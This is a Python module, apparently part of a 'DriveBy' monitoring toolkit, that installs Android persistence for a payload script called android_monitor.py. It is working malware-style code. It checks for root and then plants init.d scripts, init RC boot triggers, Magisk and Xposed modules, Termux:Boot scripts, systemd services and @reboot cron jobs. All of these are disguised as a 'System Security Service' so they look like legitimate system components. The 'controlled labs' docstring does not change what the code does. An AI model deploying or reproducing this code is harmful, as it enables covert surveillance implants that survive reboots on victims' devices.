#!/usr/bin/env python3
"""
Android Persistence Module
Ensures DriveBy monitoring processes restart after shutdown/restart (best-effort in controlled labs).
All operations are wrapped in try/except and will safely return False if the environment lacks permissions.
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path
from typing import List


class AndroidPersistence:
    def __init__(self):
        # Path to the Android monitor script in this project
        self.script_path = (Path(__file__).resolve().parent.parent / "payloads" / "android_monitor.py")
        self.package_name = "com.android.system.security"

    # ----------------------
    # Helpers
    # ----------------------
    def _exists(self, path: str) -> bool:
        try:
            return os.path.exists(path)
        except Exception:
            return False

    def check_root_access(self) -> bool:
        """Check if device has root access (best-effort)."""
        try:
            root_indicators = [
                "/system/xbin/su",
                "/system/bin/su",
                "/sbin/su",
                "/data/adb/magisk",
            ]
            if any(self._exists(p) for p in root_indicators):
                return True

            # Try to run 'su -c id'
            try:
                result = subprocess.run(["su", "-c", "id"], capture_output=True, timeout=5)
                return result.returncode == 0
            except Exception:
                return False
        except Exception:
            return False

    # ----------------------
    # Rooted mechanisms
    # ----------------------
    def create_init_d_persistence(self) -> bool:
        """Create init.d script for rooted devices (legacy init.d ROMs)."""
        try:
            init_file = "/system/etc/init.d/99security"
            init_dir = "/system/etc/init.d"

            # Ensure init.d exists
            if not self._exists(init_dir):
                print(" init.d directory not present; skipping")
                return False

            init_script = f"""#!/system/bin/sh
# Android System Security Service

case "$1" in
  start)
    /system/bin/python {self.script_path} &
    echo $! > /data/local/tmp/security_service.pid
    ;;
  stop)
    if [ -f /data/local/tmp/security_service.pid ]; then
      kill `cat /data/local/tmp/security_service.pid`
      rm /data/local/tmp/security_service.pid
    fi
    ;;
  restart)
    $0 stop
    sleep 2
    $0 start
    ;;
  *)
    echo "Usage: $0 {{start|stop|restart}}"
    exit 1
    ;;
esac

exit 0
"""

            with open(init_file, "w", encoding="utf-8") as f:
                f.write(init_script)
            os.chmod(init_file, 0o755)

            try:
                subprocess.run([init_file, "start"], check=False, capture_output=True)
            except Exception:
                pass

            print(" Init.d persistence attempted")
            return True
        except Exception as e:
            print(f" Init.d persistence failed: {e}")
            return False

    def create_property_trigger_persistence(self) -> bool:
        """Create property trigger in init RC to start on boot (rooted)."""
        try:
            init_dir = "/system/etc/init"
            if not self._exists(init_dir):
                print(" /system/etc/init not present; skipping")
                return False

            rc_file = f"{init_dir}/security_service.rc"
            rc_content = f"""service security_service /system/bin/python {self.script_path}
    class main
    user system
    group system
    oneshot
    disabled

on property:sys.boot_completed=1
    start security_service

on property:dev.bootcomplete=1
    start security_service
"""

            with open(rc_file, "w", encoding="utf-8") as f:
                f.write(rc_content)

            print(" Property trigger persistence attempted")
            return True
        except Exception as e:
            print(f" Property trigger persistence failed: {e}")
            return False

    def create_magisk_module_persistence(self) -> bool:
        """Create Magisk module for persistence (if Magisk present)."""
        try:
            magisk_dir = "/data/adb"
            if not self._exists(magisk_dir):
                print(" Magisk base directory not found; skipping")
                return False

            module_dir = "/data/adb/modules/system_security"
            os.makedirs(module_dir, exist_ok=True)

            module_prop = """id=system_security
name=System Security Service
version=v1.0
versionCode=1
author=System
description=System Security Update Service
"""
            with open(f"{module_dir}/module.prop", "w", encoding="utf-8") as f:
                f.write(module_prop)

            service_script = f"""#!/system/bin/sh
# Start security service
nohup /system/bin/python {self.script_path} > /dev/null 2>&1 &
"""
            with open(f"{module_dir}/service.sh", "w", encoding="utf-8") as f:
                f.write(service_script)
            os.chmod(f"{module_dir}/service.sh", 0o755)

            post_fs_script = """#!/system/bin/sh
# Post-fs-data script
mkdir -p /data/local/tmp/security
"""
            with open(f"{module_dir}/post-fs-data.sh", "w", encoding="utf-8") as f:
                f.write(post_fs_script)
            os.chmod(f"{module_dir}/post-fs-data.sh", 0o755)

            print(" Magisk module persistence attempted")
            return True
        except Exception as e:
            print(f" Magisk module persistence failed: {e}")
            return False

    def create_xposed_module_persistence(self) -> bool:
        """Create Xposed-style module directory drop (if installer present)."""
        try:
            xposed_root = "/data/data/de.robv.android.xposed.installer"
            if not self._exists(xposed_root):
                print(" Xposed installer not present; skipping")
                return False

            module_dir = f"{xposed_root}/modules/system_security"
            os.makedirs(module_dir, exist_ok=True)

            manifest = {
                "package": self.package_name,
                "name": "System Security Service",
                "version": "1.0",
                "description": "System Security Update Service",
                "main_class": "com.android.system.security.SecurityModule",
            }
            import json

            with open(f"{module_dir}/module.json", "w", encoding="utf-8") as f:
                json.dump(manifest, f, indent=2)

            print(" Xposed module persistence attempted")
            return True
        except Exception as e:
            print(f" Xposed module persistence failed: {e}")
            return False

    # ----------------------
    # Non-root mechanisms (best-effort)
    # ----------------------
    def create_systemd_user_service(self) -> bool:
        """Create systemd user service (some Android distributions may use systemd)."""
        try:
            if shutil.which("systemctl") is None:
                print(" systemctl not available; skipping")
                return False

            service_content = f"""[Unit]
Description=System Security Service
After=default.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self.script_path}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
            systemd_dir = Path.home() / ".config" / "systemd" / "user"
            systemd_dir.mkdir(parents=True, exist_ok=True)
            service_file = systemd_dir / "system-security.service"

            with open(service_file, "w", encoding="utf-8") as f:
                f.write(service_content)

            try:
                subprocess.run(["systemctl", "--user", "enable", "system-security.service"], check=False, capture_output=True)
                subprocess.run(["systemctl", "--user", "start", "system-security.service"], check=False, capture_output=True)
            except Exception:
                pass

            print(" Systemd user service persistence attempted")
            return True
        except Exception as e:
            print(f" Systemd user service persistence failed: {e}")
            return False

    def create_termux_boot_persistence(self) -> bool:
        """Create Termux:Boot startup script if Termux is installed."""
        try:
            termux_root = "/data/data/com.termux"
            if not self._exists(termux_root):
                print(" Termux not detected; skipping")
                return False

            boot_dir = Path.home() / ".termux" / "boot"
            boot_dir.mkdir(parents=True, exist_ok=True)

            boot_script = f"""#!/data/data/com.termux/files/usr/bin/bash
cd "{Path(__file__).resolve().parent.parent}"
nohup python {self.script_path} > /dev/null 2>&1 &
"""
            boot_file = boot_dir / "security_service"
            with open(boot_file, "w", encoding="utf-8") as f:
                f.write(boot_script)
            os.chmod(boot_file, 0o755)

            print(" Termux boot persistence attempted")
            return True
        except Exception as e:
            print(f" Termux boot persistence failed: {e}")
            return False

    def create_cron_wrapper(self) -> str:
        """Create a simple cron wrapper script (for environments with cron)."""
        wrapper_path = "/data/local/tmp/security_wrapper.sh"
        try:
            wrapper_content = f"""#!/system/bin/sh
cd "{Path(__file__).resolve().parent.parent}"
while true; do
  python {self.script_path} > /dev/null 2>&1
  sleep 30
done
"""
            with open(wrapper_path, "w", encoding="utf-8") as f:
                f.write(wrapper_content)
            os.chmod(wrapper_path, 0o755)
            return wrapper_path
        except Exception:
            return ""

    def create_cron_persistence(self) -> bool:
        """Create cron entry (if cron available)."""
        try:
            if shutil.which("crontab") is None:
                print(" crontab not available; skipping")
                return False

            wrapper_script = self.create_cron_wrapper()
            if not wrapper_script:
                print(" Failed to create cron wrapper")
                return False

            # Read current crontab
            try:
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                current_cron = result.stdout if result.returncode == 0 else ""
            except Exception:
                current_cron = ""

            cron_entry = f"@reboot {wrapper_script}\n"
            if wrapper_script not in current_cron:
                new_cron = current_cron + cron_entry
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                proc.communicate(input=new_cron)
                if proc.returncode != 0:
                    print(" Failed to install new crontab")
                    return False

            print(" Cron persistence attempted")
            return True
        except Exception as e:
            print(f" Cron persistence failed: {e}")
            return False

    # ----------------------
    # Orchestrators
    # ----------------------
    def install_all_persistence(self) -> bool:
        """Attempt multiple persistence techniques based on environment."""
        results: List[bool] = []
        print(" Installing Android persistence mechanisms...")

        is_rooted = self.check_root_access()

        # Rooted mechanisms
        if is_rooted:
            results.append(self.create_init_d_persistence())
            results.append(self.create_property_trigger_persistence())
            if self._exists("/data/adb/magisk"):
                results.append(self.create_magisk_module_persistence())
            if self._exists("/data/data/de.robv.android.xposed.installer"):
                results.append(self.create_xposed_module_persistence())

        # Non-root / userland mechanisms
        if self._exists("/data/data/com.termux"):
            results.append(self.create_termux_boot_persistence())
        if shutil.which("systemctl"):
            results.append(self.create_systemd_user_service())
        if shutil.which("crontab"):
            results.append(self.create_cron_persistence())

        successful = sum(1 for r in results if r)
        total = len(results)
        print(f" Android persistence: {successful}/{total} methods attempted successfully")
        return successful > 0

    def remove_persistence(self) -> bool:
        """Remove persistence artifacts created by this module (best-effort)."""
        try:
            # Stop/remove init.d
            try:
                if self._exists("/system/etc/init.d/99security"):
                    subprocess.run(["/system/etc/init.d/99security", "stop"], capture_output=True)
                    os.remove("/system/etc/init.d/99security")
            except Exception:
                pass

            # Property trigger
            try:
                if self._exists("/system/etc/init/security_service.rc"):
                    os.remove("/system/etc/init/security_service.rc")
            except Exception:
                pass

            # Magisk module
            try:
                if self._exists("/data/adb/modules/system_security"):
                    shutil.rmtree("/data/adb/modules/system_security", ignore_errors=True)
            except Exception:
                pass

            # Xposed module
            try:
                xposed_mod = "/data/data/de.robv.android.xposed.installer/modules/system_security"
                if self._exists(xposed_mod):
                    shutil.rmtree(xposed_mod, ignore_errors=True)
            except Exception:
                pass

            # Termux boot
            try:
                boot_file = Path.home() / ".termux" / "boot" / "security_service"
                if boot_file.exists():
                    boot_file.unlink()
            except Exception:
                pass

            # systemd user service
            try:
                if shutil.which("systemctl"):
                    subprocess.run(["systemctl", "--user", "stop", "system-security.service"], capture_output=True)
                    subprocess.run(["systemctl", "--user", "disable", "system-security.service"], capture_output=True)
                service_file = Path.home() / ".config" / "systemd" / "user" / "system-security.service"
                if service_file.exists():
                    service_file.unlink()
            except Exception:
                pass

            # Crontab entry and wrapper
            try:
                if shutil.which("crontab"):
                    result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                    if result.returncode == 0:
                        lines = result.stdout.splitlines()
                        filtered = [ln for ln in lines if "security_wrapper.sh" not in ln]
                        new_cron = "\n".join(filtered) + ("\n" if filtered else "")
                        proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                        proc.communicate(input=new_cron)
                # Remove wrapper
                if self._exists("/data/local/tmp/security_wrapper.sh"):
                    os.remove("/data/local/tmp/security_wrapper.sh")
            except Exception:
                pass

            print(" Android persistence removal attempted")
            return True
        except Exception as e:
            print(f" Error removing persistence: {e}")
            return False


# Optional CLI usage for this module directly
if __name__ == "__main__":
    persistence = AndroidPersistence()
    if len(sys.argv) > 1 and sys.argv[1] == "remove":
        persistence.remove_persistence()
    else:
        persistence.install_all_persistence()
